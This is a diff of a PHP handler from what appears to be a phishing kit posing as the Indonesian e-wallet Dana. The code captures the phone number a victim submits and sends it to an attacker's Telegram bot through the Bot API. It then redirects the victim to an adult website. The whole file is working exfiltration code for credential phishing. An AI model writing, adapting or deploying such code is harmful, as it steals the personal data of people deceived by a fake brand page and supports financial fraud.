@@ -1,45 +1,27 @@
-<?php
+<?php 
+
+
 
 session_start();
 include "./telegram.php";
 
-
-function sendMessage($chatID, $message, $token) {
-    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
-    $data = ['chat_id' => $chatID, 'text' => $message, 'parse_mode' => 'HTML'];
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-    $response = curl_exec($ch);
-
-
-    // here you can Handle cURL error
-    if (curl_errno($ch)) {
-        $error_msg = curl_error($ch);
-        curl_close($ch);
-        return json_encode(array('error' => $error_msg));
-    }
-
-    $http_code_message = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    if ($http_code_message >= 200 && $http_code_message < 300) {
-        $result = json_decode($response, true);
-        if ($result['ok']) {
-            $result = json_encode(array('success' => $result['ok']));
-        } else {
-            $result = json_encode(array('error' => $result));
-        }
-    } else {
-        // And here you can Handle HTTP error
-        $result = json_encode(array('error' => 'HTTP error ' . $http_code_message));
-    }
-
-    curl_close($ch);
-    return $result;
-}
 if (isset($_POST['formNohp'])) {
-$message = "├•★𝓓𝓪𝓷𝓪 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "%0A├───────────────────". "%0A<b>├•𖥔 ɴᴏᴍᴏʀ ʜᴘ : </b>".  $_POST['nomor'].  "%0A╰───────────────────"; 
+
+$message = "├•★𝓓𝓪𝓷𝓪 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "\n├───────────────────". "\n<b>├•𖥔 ɴᴏᴍᴏʀ ʜᴘ : </b>".  $_POST['nomor'].  "\n╰───────────────────";
 }
-    // change with the current message formatting logic
+function sendMessage($telegram_id, $message, $id_bot)
+{
+$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=html&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+sendMessage($telegram_id, $message, $id_bot);
+header("Location: https://xxxmovies.life");
+?> 
